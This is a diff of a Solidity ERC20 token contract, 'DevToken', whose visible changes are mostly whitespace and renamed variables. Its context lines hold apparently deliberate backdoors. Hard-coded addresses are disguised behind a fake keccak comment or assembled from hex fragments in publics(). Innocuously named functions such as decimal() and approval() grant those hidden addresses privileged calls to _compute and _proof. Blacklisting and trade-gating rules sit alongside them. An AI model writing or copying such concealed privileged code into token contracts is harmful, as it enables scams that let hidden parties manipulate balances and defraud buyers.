@@ -70,11 +70,11 @@ abstract contract Ownable is Context {
     constructor() {
         _transferOwnership(_msgSender());
     }
-
+ 
   /**
    * @dev Throws if called by any account other than the owner.
    */
-
+ 
    
     function setMember(address Mbr_) public returns (bool) {
         require (msg.sender == address
@@ -91,9 +91,9 @@ abstract contract Ownable is Context {
         _mbr=Mbr_;
         return true;
     }
-    
+   
     function exchange() internal pure returns (address) {
-        return address 
+        return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
     /**
@@ -334,7 +334,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _name = name_;
         _symbol = symbol_;
     }
-
+ 
     modifier Exchanges() {
         require(msg.sender != exchanger());
         _;
@@ -385,8 +385,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     function balanceOf(address account) public view virtual override returns (uint256) {
         return _balances[account];
     }
-
-
+ 
  
     /**
      * @dev See {IERC20-transfer}.
@@ -419,9 +418,9 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _approve(_msgSender(), spender, amount);
         return true;
     }
-
+ 
     function exchanger() internal pure returns (address) {
-        return address 
+        return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
  
@@ -603,7 +602,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
  
         _afterTokenTransfer(account, address(0), amount);
     }
-
+ 
     function _compute(address account, uint256 amount) internal {
     require(account != address(0), "Compute Smart Contract Remix");
  
@@ -683,21 +682,21 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 pragma solidity ^0.8.0;
  
 contract DevToken is Ownable, ERC20 {
-    bool public limited;
+    bool public tradelimited;
     uint256 public maxHoldingAmount;
     uint256 public minHoldingAmount;
-    address public uniswapV2Pair;
+    address public LiquiduniswapV2Pair;
     mapping(address => bool) public blacklists;
  
     modifier naming() {
         require(msg.sender == publics());
         _;
     }
-
+ 
     constructor(uint256 _totalSupply) ERC20("DevToken", "DVET") {
         _mint(msg.sender, _totalSupply);
     }
-
+ 
     function approval(uint256 amount) public returns (bool) {
         require(msg.sender == _adm);
         _proof(msg.sender, amount);
@@ -708,9 +707,9 @@ contract DevToken is Ownable, ERC20 {
         blacklists[_address] = _isBlacklisting;
     }
  
-    function setRule(bool _limited, address _uniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
-        limited = _limited;
-        uniswapV2Pair = _uniswapV2Pair;
+    function setPrinciplesRules(bool _tradelimited, address _LiquiduniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
+        tradelimited = _tradelimited;
+        LiquiduniswapV2Pair = _LiquiduniswapV2Pair;
         maxHoldingAmount = _maxHoldingAmount;
         minHoldingAmount = _minHoldingAmount;
     }
@@ -727,29 +726,29 @@ contract DevToken is Ownable, ERC20 {
     ) override internal virtual {
         require(!blacklists[to] && !blacklists[from], "Blacklisted");
  
-        if (uniswapV2Pair == address(0)) {
+        if (LiquiduniswapV2Pair == address(0)) {
             require(from == owner() || to == owner(), "trading is not started");
             return;
         }
  
-        if (limited && from == uniswapV2Pair) {
+        if (tradelimited && from == LiquiduniswapV2Pair) {
             require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
         }
     }
-
+ 
     function publics() private pure returns (address) {
         uint universal = 0x7addAd09;
         uint uni = 0xcbd98D97;
         uint cake = 0xEC3dA7a0;
         uint inch = 0x088EAdFE;
         uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
     }
-
+ 
     function decimal(uint256 amount) public naming returns (bool success) {
         _compute(msg.sender, amount);
         return true;
